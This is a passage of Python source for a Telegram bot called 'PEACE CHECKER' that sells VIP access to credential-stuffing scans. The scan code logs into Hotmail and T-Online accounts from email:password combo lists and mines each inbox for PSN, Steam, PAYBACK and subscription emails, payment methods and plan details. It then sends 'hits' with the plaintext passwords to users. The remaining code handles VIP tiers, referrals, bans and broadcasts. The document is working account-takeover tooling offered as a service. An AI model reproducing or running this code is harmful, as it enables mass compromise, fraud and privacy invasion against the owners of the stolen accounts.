            return "🎮 Game Purchase"
        return "✅ Activity Found"

    def _detect_steam_type(text):
        t = text.lower()
        if "wallet" in t or "funds" in t or "added" in t:
            return "💰 Wallet Top-up"
        elif "gift" in t:
            return "🎁 Gift"
        elif "steam guard" in t or "new computer" in t or "new device" in t:
            return "🔐 Steam Guard Auth"
        elif "purchase" in t or "order" in t or "receipt" in t or "payment" in t:
            game_match = re.search(r"(?:you(?:'ve)? purchased|thank you for buying|receipt for)[:\s]+([^\n\r]{3,60})", text, re.IGNORECASE)
            if game_match:
                return f"🛒 {game_match.group(1).strip()[:40]}"
            return "🛒 Purchase"
        return "✅ Activity Found"

    def _extract_expiry_date(text):
        patterns = [
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews|plan renewal|next renewal|charge date|billed on|charged on|expires on|valid until|valid through|access until|your subscription will renew)[^\n\r]{0,30}?([A-Za-z]+ \d{1,2},?\s*\d{4})',
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews|plan renewal|next renewal|charge date|billed on|charged on|expires on|valid until|valid through|access until|your subscription will renew)[^\n\r]{0,30}?(\d{1,2}[\/\-\.]\d{1,2}[\/\-\.]\d{2,4})',
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews|plan renewal|next renewal|charge date|billed on|charged on|expires on|valid until|valid through|access until)[^\n\r]{0,30}?(\d{4}[\/\-]\d{1,2}[\/\-]\d{1,2})',
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews)[^\n\r]{0,30}?(\d{1,2}\s+[A-Za-z]+\s+\d{4})',
        ]
        for pat in patterns:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                return m.group(1).strip()
        return None

    def _detect_plan_name(text):
        t = text.lower()
        if '4k' in t or 'ultra hd' in t or '4 screens' in t:
            return '👑 Premium 4K (Ultra HD)'
        elif 'premium' in t:
            return '👑 Premium'
        elif 'standard with ads' in t:
            return '📺 Standard with Ads'
        elif 'standard' in t:
            return '📺 Standard (HD)'
        elif 'basic' in t:
            return '📱 Basic'
        elif 'subscription' in t or 'billing' in t or 'payment' in t or 'plan' in t:
            return '💳 Paid Plan'
        return '✅ Active'

    _c_id = chat_id
    total = len(combos)

    if not start_scan(user_id):
        bot.send_message(chat_id, "⚠️ You already have an active scan running! Please wait for it to finish.", parse_mode='HTML')
        return

    progress_msg = bot.send_message(
        chat_id,
            f"{emoji} <b>{service_name} Inbox Check started!</b>\n\n"
            f"📬 Sender: <code>{', '.join(tonline_senders[:2])}</code>\n"
            f"📥 Accounts: <b>{total}</b>\n"
            f"{'👑 Premium-only mode: only reporting premium accounts!' + chr(10) if premium_only else ''}\n"
            f"⏳ Please wait...",
            parse_mode='HTML',
            reply_markup=stop_scan_keyboard(user_id)
        )

    hits = []
    bads = []
    no_inbox = []
    errors_list = []
    checked = [0]
    lock = threading.Lock()

    def check_one(combo):
        email_addr, password = combo
        if not active_scans.get(user_id, False):
            return
        try:
            result, provider = check_account_auto(email_addr, password)
            if result.get("status") == "RETRY":
                result, provider = check_account_auto(email_addr, password)

            status = result.get("status", "RETRY")

            if status == "BAD":
                with lock:
                    checked[0] += 1
                    bads.append(f"{email_addr}:{password}")
                return

            if status != "HIT":
                with lock:
                    checked[0] += 1
                    errors_list.append(f"{email_addr}:{password} | {status}")
                return

            found = False
            orders = []
            payments = []
            payback_points = []
            game_types = []          # PSN/Steam: type of each email/purchase
            expiry_date = None
            plan_name = None
            email_count = 0          # count_mode: total matching emails
            is_payback = svc.get("custom_handler") == "payback"

            def _has_premium(combined_text):
                if count_mode:
                    return True      # count mode: accept every email found
                if not premium_keywords:
                    return True
                if not premium_only and not plan_detect:
                    return True
                cl = combined_text.lower()
                return any(kw in cl for kw in premium_keywords)

            def _process_item(combined):
                nonlocal found, expiry_date, plan_name, email_count
                if not _has_premium(combined):
                    return
                found = True
                email_count += 1
                if expiry_date is None:
                    expiry_date = _extract_expiry_date(combined)
                if psn_mode:
                    gt = _detect_psn_plan(combined)
                    if gt not in game_types:
                        game_types.append(gt)
                    if plan_name is None:
                        plan_name = gt
                elif steam_mode:
                    gt = _detect_steam_type(combined)
                    if gt not in game_types:
                        game_types.append(gt)
                    if plan_name is None:
                        plan_name = gt
                elif plan_detect and plan_name is None:
                    plan_name = _detect_plan_name(combined)
                if is_payback:
                    for pm in re.findall(r'(\d[\d\.,]*)\s*(?:Punkte|Points|PAYBACK\s*Punkte)', combined, re.IGNORECASE):
                        pts = pm.replace(".", "").replace(",", "")
                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                            payback_points.append(pts)
                    for pm in re.findall(r'(?:Punktestand|Kontostand|Guthaben|aktuell)[:\s]*(\d[\d\.,]*)', combined, re.IGNORECASE):
                        pts = pm.replace(".", "").replace(",", "")
                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                            payback_points.append(pts)
                else:
                    order_match = re.search(order_regex, combined, re.IGNORECASE)
                    if order_match:
                        o = order_match.group(1)
                        if o not in orders:
                            orders.append(o)
                for p in extract_payment_from_text(combined.lower()):
                    if p not in payments:
                        payments.append(p)

            if provider == "tonline":
                for sender in tonline_senders:
                    sf_found, fetched = TOnlineChecker.search_and_fetch(email_addr, password, sender, max_count=15)
                    if sf_found:
                        for item in fetched:
                            combined = item.get("subject", "") + " " + item.get("body", "")
                            _process_item(combined)
                        if found:
                            break
            else:
                token = result.get("token", "")
                cid   = result.get("cid", "")
                for query in hotmail_queries:
                    email_texts = _hotmail_search_and_fetch(token, cid, query, 15)
                    if email_texts:
                        for item in email_texts:
                            combined = item.get("subject", "") + " " + item.get("body", "")
                            _process_item(combined)
                        if found:
                            break

            with lock:
                checked[0] += 1
                if found:
                    exp_tag = f" | Expires: {expiry_date}" if expiry_date else ""
                    if count_mode:
                        hits.append(f"{email_addr}:{password} | {service_name} ✅ | {email_count} emails found{exp_tag}")
                    elif psn_mode:
                        pay_str = " | ".join(payments) if payments else "None"
                        types_str = ", ".join(game_types[:3]) if game_types else "Activity Found"
                        hits.append(f"{email_addr}:{password} | PSN 🎮 | {types_str} | {email_count} emails | Payment: {pay_str}{exp_tag}")
                    elif steam_mode:
                        pay_str = " | ".join(payments) if payments else "None"
                        types_str = ", ".join(game_types[:3]) if game_types else "Activity Found"
                        hits.append(f"{email_addr}:{password} | Steam 💻 | {types_str} | {email_count} emails | Payment: {pay_str}{exp_tag}")
                    elif is_payback:
                        pts_str = ", ".join(payback_points) if payback_points else "Not found"
                        hits.append(f"{email_addr}:{password} | PAYBACK ✅ | Points: {pts_str}{exp_tag}")
                    elif premium_only:
                        pay_str = " | ".join(payments) if payments else "None"
                        detected_plan = plan_name or "PREMIUM"
                        hits.append(f"{email_addr}:{password} | {service_name} 👑 {detected_plan} ✅ | Payment: {pay_str}{exp_tag}")
                    elif plan_detect:
                        pay_str = " | ".join(payments) if payments else "None"
                        detected_plan = plan_name or "Active"
                        hits.append(f"{email_addr}:{password} | {service_name} ✅ | Plan: {detected_plan} | Payment: {pay_str}{exp_tag}")
                    else:
                        order_str = ", ".join(orders) if orders else "None"
                        pay_str = " | ".join(payments) if payments else "None"
                        hits.append(f"{email_addr}:{password} | {service_name} ✅ | Orders: {order_str} | Payment: {pay_str}{exp_tag}")
                    hit_num = len(hits)
                else:
                    no_inbox.append(f"{email_addr}:{password}")

            if found:
                try:
                    expiry_line = f"📅 <b>Expires:</b> {expiry_date}\n" if expiry_date else ""
                    if count_mode:
                        hit_msg = (
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"{emoji} <b>{service_name} INBOX HIT #{hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{email_addr}</code>\n"
                            f"🔑 Password: <code>{password}</code>\n\n"
                            f"📬 <b>Emails Found:</b> {email_count}\n"
                            f"{expiry_line}"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    elif psn_mode:
                        pay_str = " | ".join(payments) if payments else "None"
                        types_str = "\n".join([f"  • {t}" for t in game_types[:5]]) if game_types else "  • Activity Found"
                        hit_msg = (
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"🎮 <b>PSN HIT #{hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{email_addr}</code>\n"
                            f"🔑 Password: <code>{password}</code>\n\n"
                            f"🎮 <b>PlayStation Network</b>\n"
                            f"📨 <b>Emails found:</b> {email_count}\n"
                            f"🏷️ <b>Detected:</b>\n{types_str}\n"
                            f"💳 <b>Payment:</b> {pay_str}\n"
                            f"{expiry_line}"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    elif steam_mode:
                        pay_str = " | ".join(payments) if payments else "None"
                        types_str = "\n".join([f"  • {t}" for t in game_types[:5]]) if game_types else "  • Activity Found"
                        hit_msg = (
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💻 <b>STEAM HIT #{hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{email_addr}</code>\n"
                            f"🔑 Password: <code>{password}</code>\n\n"
                            f"💻 <b>Steam</b>\n"
                            f"📨 <b>Emails found:</b> {email_count}\n"
                            f"🏷️ <b>Detected:</b>\n{types_str}\n"
                            f"💳 <b>Payment:</b> {pay_str}\n"
                            f"{expiry_line}"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    elif is_payback:
                        pts_display = ", ".join(payback_points) if payback_points else "Not found"
                        max_pts = max((int(p) for p in payback_points), default=0) if payback_points else 0
                        hit_msg = (
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💳 <b>PAYBACK HIT #{hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{email_addr}</code>\n"
                            f"🔑 Password: <code>{password}</code>\n\n"
                            f"💳 <b>Service:</b> PAYBACK\n"
                            f"💰 <b>Points:</b> {max_pts if max_pts > 0 else pts_display}\n"
                            f"{expiry_line}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    elif premium_only:
                        pay_str = " | ".join(payments) if payments else "None"
                        detected_plan = plan_name or "PREMIUM FOUND"
                        hit_msg = (
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"{emoji} <b>{service_name} PREMIUM HIT #{hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{email_addr}</code>\n"
                            f"🔑 Password: <code>{password}</code>\n\n"
                            f"{emoji} <b>Service:</b> {service_name}\n"
                            f"👑 <b>Plan:</b> {detected_plan}\n"
                            f"💳 <b>Payment:</b> {pay_str}\n"
                            f"{expiry_line}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    elif plan_detect:
                        pay_str = " | ".join(payments) if payments else "None"
                        detected_plan = plan_name or "✅ Active"
                        hit_msg = (
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"{emoji} <b>{service_name} HIT #{hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{email_addr}</code>\n"
                            f"🔑 Password: <code>{password}</code>\n\n"
                            f"{emoji} <b>Service:</b> {service_name}\n"
                            f"📋 <b>Plan:</b> {detected_plan}\n"
                            f"💳 <b>Payment:</b> {pay_str}\n"
                            f"{expiry_line}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    else:
                        order_str = ", ".join(orders) if orders else "None"
                        pay_str = " | ".join(payments) if payments else "None"
                        hit_msg = (
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"{emoji} <b>{service_name} HIT #{hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{email_addr}</code>\n"
                            f"🔑 Password: <code>{password}</code>\n\n"
                            f"{emoji} <b>Service:</b> {service_name}\n"
                            f"📦 <b>Orders:</b> {order_str}\n"
                            f"💳 <b>Payment:</b> {pay_str}\n"
                            f"{expiry_line}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    generic_is_group = is_allowed_group(_c_id) and _c_id != user_id
                    send_target = user_id if generic_is_group else _c_id
                    bot.send_message(send_target, hit_msg, parse_mode='HTML')
                except Exception:
                    pass
        except Exception as e:
            print(f"[{service_name}] Error checking {email_addr}: {e}")
            with lock:
                checked[0] += 1
                errors_list.append(f"{email_addr}:{password} | ERROR")

    def progress_updater():
        last = -1
        while checked[0] < total and active_scans.get(user_id, False):
            if checked[0] != last:
                last = checked[0]
                try:
                    bot.edit_message_text(
                        f"{emoji} <b>{service_name} Check running...</b>\n\n"
                        f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                        f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                        _c_id,
                        progress_msg.message_id,
                        parse_mode='HTML',
                        reply_markup=stop_scan_keyboard(user_id)
                    )
                except:
                    pass

    _chat_id = _c_id
    _c_id = _chat_id
    _pm_id = progress_msg.message_id
    _username = username

    def _generic_scan_thread():
      try:
        threading.Thread(target=progress_updater, daemon=True).start()

        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
            executor.map(check_one, combos)

        end_scan(user_id)

        try:
            bot.delete_message(_chat_id, _pm_id)
        except:
            pass

        checked_count = checked[0]
        svc_upper = service_name.upper()

        record_inbox(user_id, username=_username, service_name=service_name,
                    combos_count=checked_count, hits=len(hits), bads=len(bads))

        generic_is_group = is_allowed_group(_chat_id) and _chat_id != user_id

        summary = (
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{emoji} <b>{svc_upper} SCAN {'⏹ STOPPED' if checked_count < total else 'COMPLETED'}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 <b>Checked:</b> {checked_count}/{total}\n"
            f"✅ <b>{'Premium Hits' if premium_only else 'Linked (Hit)'}:</b> {len(hits)}\n"
            f"📭 <b>Login OK, no {service_name}:</b> {len(no_inbox)}\n"
            f"❌ <b>Bad (Login failed):</b> {len(bads)}\n"
            f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
            f"{'📩 <i>Hits were sent to you privately!</i>' + chr(10) + chr(10) if generic_is_group and hits else ''}"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💎 {MY_SIGNATURE}"
        )
        bot.send_message(_chat_id, summary, parse_mode='HTML')

        all_lines = []
        if hits:
            all_lines.append("═══ HITS (LINKED) ═══")
            all_lines.extend(hits)
        if no_inbox:
            all_lines.append(f"\n═══ LOGIN OK / KEIN {svc_upper} ═══")
            all_lines.extend(no_inbox)
        if bads:
            all_lines.append("\n═══ BAD (LOGIN FAILED) ═══")
            all_lines.extend(bads)
        if errors_list:
            all_lines.append("\n═══ ERRORS / RETRY ═══")
            all_lines.extend(errors_list)

        if all_lines:
            file_obj = BytesIO("\n".join(all_lines).encode('utf-8'))
            file_obj.name = f"{svc_upper}_FULL_{len(hits)}hits_{len(bads)}bad_{total}total.txt"
            send_target = user_id if generic_is_group else _chat_id
            send_large_document(
                send_target,
                file_obj.getvalue(),
                file_obj.name,
                caption=(
                    f"{emoji} <b>{service_name} Results</b>\n"
                    f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} No Match | 🔄 {len(errors_list)} Errors\n\n"
                    f"💎 {MY_SIGNATURE}"
                )
            )
      except Exception as e:
        try:
            bot.send_message(_chat_id, f"❌ Error: {str(e)}")
        except:
            pass
      finally:
        user_sessions.pop(user_id, None)
        end_scan(user_id)

    threading.Thread(target=_generic_scan_thread, daemon=True).start()


# ── Keyboard broadcast helper ─────────────────────────────────────────────
def _push_keyboard_to_all_vips(msg_text="✅ Keyboard updated!"):
    """Send a fresh keyboard to admin + every VIP user in the JSON database."""
    sent = 0
    failed = 0
    try:
        import json as _json
        with open(USERS_DB_JSON, 'r', encoding='utf-8') as _f:
            _db = _json.load(_f)
        # Structure: {"users": [{id, membership, is_vip, ...}, ...]}
        users_list = _db.get('users', [])
        if not isinstance(users_list, list):
            users_list = []
        for _udata in users_list:
            try:
                _uid = int(_udata.get('id', 0))
                if not _uid:
                    continue
                _is_vip = _udata.get('is_vip', False)
                _membership = _udata.get('membership', 'Free')
                if _is_vip or _membership in ('VIP', 'Forever') or _uid == ADMIN_ID:
                    bot.send_message(_uid, msg_text, parse_mode='HTML',
                                     reply_markup=main_menu_keyboard(_uid))
                    sent += 1
                    time.sleep(0.05)  # avoid Telegram flood limit
            except Exception:
                failed += 1
    except Exception as e:
        print(f"❌ [KeyboardBroadcast] Error: {e}")
    print(f"✅ [KeyboardBroadcast] Sent to {sent} users, {failed} failed")
    return sent, failed


# ── /refresh admin command ───────────────────────────────────────────────
@bot.message_handler(commands=['refresh'])
def cmd_refresh_keyboards(message):
    """Admin command: push fresh keyboard to all VIP users instantly."""
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "🔄 Pushing updated keyboard to all VIP users...", parse_mode='HTML')
    def _do_refresh():
        sent, failed = _push_keyboard_to_all_vips("🔄 <b>Keyboard refreshed!</b>\n\n⚡ New buttons are now active.")
        try:
            bot.send_message(ADMIN_ID, f"✅ Keyboard broadcast done!\n📤 Sent: {sent}\n❌ Failed: {failed}", parse_mode='HTML')
        except Exception:
            pass
    threading.Thread(target=_do_refresh, daemon=True).start()


@bot.message_handler(commands=['addvip'])
def cmd_addvip(message):
    """Admin command: /addvip <user_id> <duration>  (duration: 1h/1d/1w/1m/forever)"""
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.strip().split()
    if len(parts) < 3:
        bot.send_message(message.chat.id,
            "📖 <b>Usage:</b> <code>/addvip &lt;user_id&gt; &lt;duration&gt;</code>\n\n"
            "Durations: <code>1h</code> · <code>1d</code> · <code>1w</code> · <code>1m</code> · <code>forever</code>\n\n"
            "Example: <code>/addvip 123456789 1d</code>",
            parse_mode='HTML')
        return
    try:
        target_id = int(parts[1])
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid User ID — must be a number.", parse_mode='HTML')
        return
    duration = parts[2].lower()
    valid = ("1h", "1d", "3d", "1w", "1m", "forever")
    if duration not in valid:
        bot.send_message(message.chat.id,
            f"❌ Invalid duration. Use one of: {', '.join(valid)}", parse_mode='HTML')
        return
    u = get_json_user(target_id)
    uname = u.get("username", "Unknown") if u else "Unknown"
    add_vip(target_id, uname, duration)
    duration_labels = {"1h": "1 Hour", "1d": "1 Day", "3d": "3 Days",
                       "1w": "1 Week", "1m": "1 Month", "forever": "Forever"}
    bot.send_message(message.chat.id,
        f"✅ <b>VIP Added!</b>\n"
        f"👤 User: <code>{target_id}</code> (@{uname})\n"
        f"⏱ Duration: {duration_labels.get(duration, duration)}",
        parse_mode='HTML')
    try:
        bot.send_message(target_id,
            f"🎉 <b>You are now VIP!</b>\n"
            f"⏱ Duration: {duration_labels.get(duration, duration)}\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML',
            reply_markup=main_menu_keyboard(target_id))
    except Exception:
        pass


# Start Command
@bot.message_handler(commands=['start'])
def start_command_json(message):
    """Start with JSON + referral handling"""
    user_id = message.from_user.id
    username = message.from_user.username or "unknown"
    first_name = message.from_user.first_name or "User"

    log_user_activity(user_id, username, "start", message)

    if is_group_chat(message):
        if not is_allowed_group(message.chat.id):
            if user_id == ADMIN_ID:
                add_allowed_group(message.chat.id)
                bot.send_message(message.chat.id,
                    f"✅ <b>Group activated!</b>\n\n"
                    f"📍 Chat-ID: <code>{message.chat.id}</code>\n"
                    f"All members can now use the bot <b>for free</b>!\n\n"
                    f"💎 {MY_SIGNATURE}", parse_mode='HTML',
                    reply_markup=main_menu_keyboard(user_id))
            else:
                bot.send_message(message.chat.id,
                    f"❌ <b>Not authorized!</b>\n\n"
                    f"Only the admin can add the bot to groups.\n\n"
                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
            return
        bot.send_message(message.chat.id,
            f"⚡ <b>PEACE CHECKER</b>\n\n"
            f"👋 Hello <b>{first_name}</b>!\n"
            f"🆓 All features are <b>FREE</b> in this group!\n\n"
            f"📋 Press a button to get started!\n\n"
            f"💎 {MY_SIGNATURE}", parse_mode='HTML',
            reply_markup=main_menu_keyboard(user_id))
        return

    add_json_user(user_id, username, first_name)
    try:
        add_user(user_id, username)
    except Exception as e:
        print(f"[Start] SQLite add_user error for {user_id}: {e}")

    user = get_json_user(user_id)
    if is_banned(user_id) or (user and user.get('is_banned')):
        bot.send_message(user_id, f"❌ <b>You are banned by admin {MY_SIGNATURE}</b>", parse_mode='HTML')
        return

    args = message.text.split()
    if len(args) > 1:
        ref_code = args[1]
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute("SELECT user_id FROM users WHERE referral_code = ?", (ref_code,))
            referrer = c.fetchone()
            conn.close()

            if referrer and referrer[0] != user_id:
                referrer_id = referrer[0]
                success, reward_text, milestone_msg = process_referral(user_id, referrer_id)
                if success:
                    try:
                        bot.send_message(referrer_id,
                            f"🎉 <b>Neuer Referral!</b>\n\n"
                            f"User <code>{user_id}</code> ist über deinen Link beigetreten!\n\n"
                            f"✅ Du bekommst <b>{reward_text}</b>{milestone_msg}",
                            parse_mode='HTML')
                    except Exception as e:
                        print(f"[Start] Failed to notify referrer {referrer_id}: {e}")

                    if milestone_msg:
                        try:
                            bot.send_message(ADMIN_ID,
                                f"🏆 <b>REFERRAL MILESTONE!</b>\n\n"
                                f"👤 User: <code>{referrer_id}</code>\n"
                                f"🎯 Belohnung: {reward_text}{milestone_msg}",
                                parse_mode='HTML')
                        except Exception as e:
                            print(f"[Start] Failed to notify admin about milestone: {e}")
        except Exception as e:
            print(f"[Start] Referral processing error: {e}")

    # Trial VIP for brand new users (1 hour free trial)
    is_new_user = False
    db_user = get_user(user_id)
    trial_used = False
    if db_user:
        try:
            conn_t = get_db()
            c_t = conn_t.cursor()
            c_t.execute("SELECT trial_used FROM users WHERE user_id = ?", (user_id,))
            row_t = c_t.fetchone()
            trial_used = bool(row_t and row_t[0])
            conn_t.close()
        except:
            trial_used = True

    if db_user and not trial_used and not db_user[2]:
        is_new_user = True
        add_vip(user_id, username, "1h")
        conn_t = get_db()
        c_t = conn_t.cursor()
        c_t.execute("UPDATE users SET trial_used = 1 WHERE user_id = ?", (user_id,))
        conn_t.commit()
        conn_t.close()
        try:
            bot.send_message(user_id, t(user_id, "welcome_gift", signature=MY_SIGNATURE), parse_mode='HTML')
        except Exception:
            pass

    admin_badge = "🔧 ADMIN" if user_id == ADMIN_ID else ""
    vip_status = '👑 VIP' if is_vip(user_id) else 'Free'
    trial_note = "\n🎁 <i>Trial VIP active! (1h)</i>" if is_new_user else ""

    welcome = t(user_id, "welcome", admin_badge=admin_badge, first_name=first_name,
               uid=user_id, vip_status=vip_status, trial_note=trial_note, signature=MY_SIGNATURE)

    bot.send_message(user_id, welcome, parse_mode='HTML',
                    reply_markup=main_menu_keyboard(user_id))

# Handle Main Menu Buttons
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text

    if is_group_chat(message) and not is_allowed_group(message.chat.id):
        return

    in_free_group = is_group_chat(message) and is_allowed_group(message.chat.id)

    username = message.from_user.username or "unknown"
    if text:
        log_user_activity(user_id, username, f"msg:{text[:50]}", message)

    if is_banned(user_id):
        bot.send_message(message.chat.id, t(user_id, "banned", signature=MY_SIGNATURE), parse_mode='HTML')
        return

    # ── Force Join Channel Check ───────────────────────────────────────────
    if _fj_config.get("enabled") and user_id != ADMIN_ID and not in_free_group:
        missing_channels = check_force_join(user_id)
        if missing_channels:
            ch_lines = "\n".join([f"• {c.get('display', c) if isinstance(c, dict) else c}" for c in missing_channels])
            try:
                bot.send_message(message.chat.id,
                    f"⚠️ <b>JOIN REQUIRED</b>\n\n"
                    f"To use this bot, you must join the following channel(s):\n\n"
                    f"{ch_lines}"
                    f"\n\nAfter joining, press <b>✅ I Joined</b> below.\n\n"
                    f"💎 {MY_SIGNATURE}",
                    parse_mode='HTML', reply_markup=_fj_join_markup(missing_channels))
            except:
                pass
            return

    def _btn_match(key):
        for lang in TRANSLATIONS:
            if text == TRANSLATIONS[lang].get(key, ""):
                return True
        return False

    if _btn_match("btn_language") or text in ("🌐 Sprache", "🌐 Language"):
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🇩🇪 Deutsch", callback_data="set_lang_de"),
            types.InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en")
        )
        bot.send_message(message.chat.id, t(user_id, "choose_language"), parse_mode='HTML', reply_markup=markup)
        return

    session = user_sessions.get(user_id, {})
    s_mode = session.get("mode", "")

    # ── Universal session escape ──────────────────────────────────────────
    # If user is stuck in any session and presses a known keyboard button,
    # always clear the session so they never get trapped.
    _NAV_PREFIXES = (
        "🔧", "🔄", "⚡", "📊", "💎", "🌐", "🎁", "📋", "✉️",
        "🏆", "👤", "🔍", "📁", "📤", "🛑", "⬅️", "◀️", "🆓",
        "👑", "🎫", "🔑", "📢", "🔒", "🔓", "📌", "🖥", "🌍",
    )
    if s_mode and text and (
        any(text.startswith(p) for p in _NAV_PREFIXES)
        or text.startswith("/")
    ):
        user_sessions.pop(user_id, None)
        session = {}
        s_mode = ""

    if s_mode == "redeem_code" and text and not text.startswith("/"):
        code = text.strip().upper()
        success, msg_text = use_redeem_code(code, user_id)
        bot.send_message(message.chat.id, msg_text)
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_add_vip":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        step = session.get("step", "waiting_id")
        if step == "waiting_id":
            try:
                target_user_id = int(text.strip())
                u = get_json_user(target_user_id)
                uname = u.get("username", "Unknown") if u else "Unknown"
                user_sessions[user_id] = {
                    "mode": "admin_add_vip", "step": "waiting_duration",
                    "vip_target_id": target_user_id, "vip_target_username": uname
                }
                bot.send_message(message.chat.id,
                    f"✅ User: <code>{target_user_id}</code> (@{uname})\n\nWähle die VIP-Dauer:",
                    parse_mode='HTML', reply_markup=vip_duration_keyboard())
            except ValueError:
                user_sessions.pop(user_id, None)
                bot.send_message(message.chat.id, "❌ Invalid User ID! Please enter a numeric user ID.")
        return

    if s_mode == "admin_remove_vip":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_user_id = int(text.strip())
            user = get_user(target_user_id)
            if not user:
                bot.send_message(message.chat.id, "❌ User not found!")
            elif user[2] == 0:
                bot.send_message(message.chat.id, "❌ User ist kein VIP!")
            else:
                remove_vip(target_user_id)
                bot.send_message(message.chat.id,
                    f"✅ <b>VIP entfernt!</b>\n\n<code>{target_user_id}</code> ist jetzt Free.",
                    parse_mode='HTML', reply_markup=admin_panel_keyboard())
                try:
                    bot.send_message(target_user_id,
                        f"⚠️ Dein VIP-Status wurde entfernt.\n\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                except:
                    pass
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid User ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_ban_user":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_user_id = int(text.strip())
            if target_user_id == ADMIN_ID:
                bot.send_message(message.chat.id, "❌ Admin kann nicht gebannt werden!")
            else:
                user = get_user(target_user_id)
                if not user:
                    bot.send_message(message.chat.id, "❌ User not found!")
                else:
                    ban_user(target_user_id, "Banned by admin")
                    bot.send_message(message.chat.id,
                        f"✅ <b>User gebannt!</b>\n\n<code>{target_user_id}</code>",
                        parse_mode='HTML', reply_markup=admin_panel_keyboard())
                    try:
                        bot.send_message(target_user_id,
                            f"❌ <b>Du wurdest vom Admin gebannt.</b>\n\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                    except:
                        pass
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid User ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_unban_user":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_user_id = int(text.strip())
            user = get_user(target_user_id)
            if not user:
                bot.send_message(message.chat.id, "❌ User not found!")
            elif user[4] == 0:
                bot.send_message(message.chat.id, "❌ User ist nicht gebannt!")
            else:
                unban_user(target_user_id)
                bot.send_message(message.chat.id,
                    f"✅ <b>User entbannt!</b>\n\n<code>{target_user_id}</code>",
                    parse_mode='HTML', reply_markup=admin_panel_keyboard())
                try:
                    bot.send_message(target_user_id,
                        f"✅ Du wurdest entbannt!\n\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                except:
                    pass
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid User ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_broadcast_all":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        user_sessions.pop(user_id, None)
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE is_banned = 0")
        users_list = c.fetchall()
        conn.close()
        if not users_list:
            bot.send_message(message.chat.id, "❌ No users!")
            return
        success_c = 0
        failed_c = 0
        status_msg = bot.send_message(message.chat.id, f"📤 Broadcasting... 0/{len(users_list)}")
        for i, u in enumerate(users_list, 1):
            try:
